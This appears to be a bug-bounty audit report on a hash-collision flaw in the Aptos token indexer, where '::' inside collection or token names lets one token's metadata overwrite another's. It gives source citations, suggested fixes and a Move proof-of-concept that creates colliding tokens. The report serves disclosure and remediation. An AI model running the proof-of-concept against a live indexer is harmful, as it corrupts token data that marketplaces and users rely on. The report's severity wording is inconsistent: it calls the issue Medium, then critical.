# Audit Report

## Title
Hash Collision Vulnerability in Token Indexer Allows Token Metadata Overwrite

## Summary
The Aptos token indexer computes `token_data_id_hash` by concatenating `creator::collection::name` and applying SHA256. Since the Move contract does not validate that collection or name fields cannot contain the delimiter `"::"`, an attacker can craft distinct `TokenDataId` objects that produce identical hashes, causing the indexer to overwrite existing token metadata in the `current_token_datas` table.

## Finding Description

The vulnerability exists in how the indexer generates hash identifiers for token data:

1. **Hash Generation Process**: The `TokenDataIdType` is converted to a string via the `Display` trait implementation, which formats it as `"{creator}::{collection}::{name}"`. This string is then hashed using SHA256. [1](#0-0) [2](#0-1) [3](#0-2) 

2. **Missing Delimiter Validation**: The Move contract's `create_token_data_id` and `create_collection` functions only validate the length of collection and name fields, but do NOT prevent the delimiter `"::"` from appearing within these strings. [4](#0-3) [5](#0-4) 

3. **Hash Collision Attack**: An attacker can create two distinct tokens that produce the same hash:
   - Token1: `{creator: 0x1, collection: "MyNFT", name: "Rare::Item"}`
   - Token2: `{creator: 0x1, collection: "MyNFT::Rare", name: "Item"}`
   
   Both produce the string representation: `"0x0000...0001::MyNFT::Rare::Item"` and therefore identical SHA256 hashes.

4. **Database Overwrite**: The indexer uses `token_data_id_hash` as the primary key in the `current_token_datas` table. [6](#0-5) 

When inserting token data, the indexer performs an `ON CONFLICT DO UPDATE` operation based on this hash: [7](#0-6) 

The WHERE clause at line 449 only checks that `last_transaction_version <= excluded.last_transaction_version`, which means if the attacker creates Token2 after Token1, Token2's metadata will overwrite Token1's metadata in the indexer database.

5. **On-Chain vs Off-Chain Divergence**: While the on-chain Move contract correctly stores both tokens as distinct entries (because the `Table<TokenDataId, TokenData>` uses the full struct as the key), the off-chain indexer treats them as the same token due to the hash collision.

## Impact Explanation

This vulnerability creates a **Medium Severity** state inconsistency issue:

- **Indexer State Corruption**: The indexer's `current_token_datas` table will contain incorrect metadata for legitimate tokens that have been overwritten by attacker-crafted tokens.
- **Application Data Integrity**: Any application (NFT marketplaces, wallets, explorers) relying on the indexer's API will display incorrect token information, including wrong metadata URIs, royalty settings, supply, and mutability configurations.
- **Token Identity Theft**: An attacker can effectively "steal" a token's identity in all indexer-dependent applications by creating a collision and populating their own metadata.
- **User Deception**: Users querying token information through the indexer will see attacker-controlled data instead of legitimate token data.

However, this does NOT qualify as Critical severity because:
- On-chain state remains correct (consensus is not affected)
- No funds can be stolen or minted on-chain
- Validator operations are unaffected
- The issue is limited to off-chain indexing infrastructure

Per Aptos bug bounty criteria, this falls under **Medium Severity** as a "State inconsistency requiring intervention."

## Likelihood Explanation

**Likelihood: High**

- **Low Barrier to Entry**: Any user can create tokens and collections with arbitrary names (within length limits)
- **No Special Privileges Required**: The attack requires no validator access or special permissions
- **Simple Execution**: Creating tokens with `"::"` in their names is straightforward
- **Immediate Impact**: The collision takes effect immediately upon indexing the second token
- **Difficult to Detect**: Without comparing on-chain state to indexer state, the discrepancy may go unnoticed

The attack is highly practical and could be executed repeatedly to corrupt multiple token records in the indexer.

## Recommendation

**Immediate Fix**: Add delimiter validation to prevent `"::"` in collection and name fields.

In `aptos-move/framework/aptos-token/sources/token.move`, modify the validation:

```move
const EINVALID_NAME_CONTAINS_DELIMITER: u64 = 40;

public fun create_token_data_id(
    creator: address,
    collection: String,
    name: String,
): TokenDataId {
    assert!(collection.length() <= MAX_COLLECTION_NAME_LENGTH, error::invalid_argument(ECOLLECTION_NAME_TOO_LONG));
    assert!(name.length() <= MAX_NFT_NAME_LENGTH, error::invalid_argument(ENFT_NAME_TOO_LONG));
    assert!(!string::contains(&collection, &string::utf8(b"::")), error::invalid_argument(EINVALID_NAME_CONTAINS_DELIMITER));
    assert!(!string::contains(&name, &string::utf8(b"::")), error::invalid_argument(EINVALID_NAME_CONTAINS_DELIMITER));
    TokenDataId { creator, collection, name }
}

public fun create_collection(
    creator: &signer,
    name: String,
    // ... other params
) acquires Collections {
    assert!(name.length() <= MAX_COLLECTION_NAME_LENGTH, error::invalid_argument(ECOLLECTION_NAME_TOO_LONG));
    assert!(!string::contains(&name, &string::utf8(b"::")), error::invalid_argument(EINVALID_NAME_CONTAINS_DELIMITER));
    // ... rest of function
}
```

**Alternative Fix**: Use a collision-resistant hash construction in the indexer:

In `crates/indexer/src/models/token_models/token_utils.rs`:

```rust
pub fn to_hash(&self) -> String {
    // Use length-prefixed encoding to prevent collisions
    let serialized = format!(
        "{}::{}::{}::{}",
        standardize_address(self.creator.as_str()),
        self.collection.len(),
        self.collection,
        self.name
    );
    hash_str(&serialized)
}
```

**Recommended Approach**: Implement both fixes for defense in depth.

## Proof of Concept

```move
// PoC demonstrating hash collision attack
module attacker::hash_collision_poc {
    use std::string::{Self, String};
    use aptos_token::token;
    use std::signer;

    public entry fun exploit_hash_collision(attacker: &signer) {
        let attacker_addr = signer::address_of(attacker);
        
        // Initialize token store
        token::opt_in_direct_transfer(attacker, true);
        
        // Create first collection and token
        token::create_collection(
            attacker,
            string::utf8(b"MyCollection"),
            string::utf8(b"Collection Description"),
            string::utf8(b"https://example.com"),
            0,
            vector[false, false, false]
        );
        
        token::create_tokendata(
            attacker,
            string::utf8(b"MyCollection"),
            string::utf8(b"Token::Name"),  // Contains "::" delimiter
            string::utf8(b"Token Description 1"),
            0,
            string::utf8(b"https://token1.com/metadata"),
            attacker_addr,
            100,
            100,
            token::create_token_mutability_config(&vector[false, false, false, false, false]),
            vector[],
            vector[],
            vector[]
        );
        
        // Create second collection that causes collision
        token::create_collection(
            attacker,
            string::utf8(b"MyCollection::Token"),  // Contains "::" delimiter
            string::utf8(b"Malicious Collection"),
            string::utf8(b"https://evil.com"),
            0,
            vector[false, false, false]
        );
        
        token::create_tokendata(
            attacker,
            string::utf8(b"MyCollection::Token"),
            string::utf8(b"Name"),  // Combined with collection, produces same hash
            string::utf8(b"Attacker Metadata - This overwrites Token 1 in indexer!"),
            999999,
            string::utf8(b"https://attacker.com/fake-metadata"),
            attacker_addr,
            100,
            0,  // Different royalty
            token::create_token_mutability_config(&vector[true, true, true, true, true]),
            vector[],
            vector[],
            vector[]
        );
        
        // Result: Both tokens exist on-chain as separate entries
        // But in the indexer's current_token_datas table,
        // they have the same hash and the second overwrites the first
    }
}
```

**Verification Steps**:
1. Deploy and execute the PoC transaction
2. Query the on-chain state: Both `TokenDataId` objects exist as distinct entries
3. Query the indexer API: Only one entry exists in `current_token_datas` with the hash, containing the second token's metadata
4. This demonstrates the divergence between on-chain truth and indexer state

## Notes

This vulnerability represents a critical flaw in the indexer's data integrity model. While the on-chain blockchain state remains secure and correct, the indexer—which serves as the primary query interface for most applications—becomes unreliable and subject to manipulation. Applications must either implement their own validation by cross-referencing on-chain state or wait for a fix to be deployed.

The root cause is the use of a string concatenation approach for hash generation without proper delimiter escaping or length-prefix encoding, combined with the lack of input validation in the Move contract.

### Citations

**File:** crates/indexer/src/models/token_models/token_utils.rs (L46-48)
```rust
    pub fn to_hash(&self) -> String {
        hash_str(&self.to_string())
    }
```

**File:** crates/indexer/src/models/token_models/token_utils.rs (L67-76)
```rust
impl fmt::Display for TokenDataIdType {
    fn fmt(&self, f: &mut Formatter) -> std::fmt::Result {
        write!(
            f,
            "{}::{}::{}",
            standardize_address(self.creator.as_str()),
            self.collection,
            self.name
        )
    }
```

**File:** crates/indexer/src/util.rs (L19-21)
```rust
pub fn hash_str(val: &str) -> String {
    hex::encode(sha2::Sha256::digest(val.as_bytes()))
}
```

**File:** aptos-move/framework/aptos-token/sources/token.move (L1161-1170)
```text
    public fun create_collection(
        creator: &signer,
        name: String,
        description: String,
        uri: String,
        maximum: u64,
        mutate_setting: vector<bool>
    ) acquires Collections {
        assert!(name.length() <= MAX_COLLECTION_NAME_LENGTH, error::invalid_argument(ECOLLECTION_NAME_TOO_LONG));
        assert!(uri.length() <= MAX_URI_LENGTH, error::invalid_argument(EURI_TOO_LONG));
```

**File:** aptos-move/framework/aptos-token/sources/token.move (L1538-1546)
```text
    public fun create_token_data_id(
        creator: address,
        collection: String,
        name: String,
    ): TokenDataId {
        assert!(collection.length() <= MAX_COLLECTION_NAME_LENGTH, error::invalid_argument(ECOLLECTION_NAME_TOO_LONG));
        assert!(name.length() <= MAX_NFT_NAME_LENGTH, error::invalid_argument(ENFT_NAME_TOO_LONG));
        TokenDataId { creator, collection, name }
    }
```

**File:** crates/indexer/src/models/token_models/token_datas.rs (L46-47)
```rust
#[diesel(primary_key(token_data_id_hash))]
#[diesel(table_name = current_token_datas)]
```

**File:** crates/indexer/src/processors/token_processor.rs (L423-449)
```rust
            diesel::insert_into(schema::current_token_datas::table)
                .values(&items_to_insert[start_ind..end_ind])
                .on_conflict(token_data_id_hash)
                .do_update()
                .set((
                    creator_address.eq(excluded(creator_address)),
                    collection_name.eq(excluded(collection_name)),
                    name.eq(excluded(name)),
                    maximum.eq(excluded(maximum)),
                    supply.eq(excluded(supply)),
                    largest_property_version.eq(excluded(largest_property_version)),
                    metadata_uri.eq(excluded(metadata_uri)),
                    payee_address.eq(excluded(payee_address)),
                    royalty_points_numerator.eq(excluded(royalty_points_numerator)),
                    royalty_points_denominator.eq(excluded(royalty_points_denominator)),
                    maximum_mutable.eq(excluded(maximum_mutable)),
                    uri_mutable.eq(excluded(uri_mutable)),
                    description_mutable.eq(excluded(description_mutable)),
                    properties_mutable.eq(excluded(properties_mutable)),
                    royalty_mutable.eq(excluded(royalty_mutable)),
                    default_properties.eq(excluded(default_properties)),
                    last_transaction_version.eq(excluded(last_transaction_version)),
                    collection_data_id_hash.eq(excluded(collection_data_id_hash)),
                    description.eq(excluded(description)),
                    inserted_at.eq(excluded(inserted_at)),
                )),
            Some(" WHERE current_token_datas.last_transaction_version <= excluded.last_transaction_version "),
```
